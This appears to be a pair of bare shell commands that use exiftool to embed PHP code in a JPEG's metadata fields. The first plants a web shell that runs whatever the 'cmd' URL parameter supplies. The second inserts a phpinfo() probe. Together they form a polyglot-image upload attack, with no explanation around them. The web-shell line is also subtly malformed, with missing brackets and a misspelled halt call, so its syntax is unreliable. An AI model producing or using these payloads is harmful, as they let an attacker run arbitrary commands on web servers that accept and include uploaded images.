exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>" /root/imagen.jpg
exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
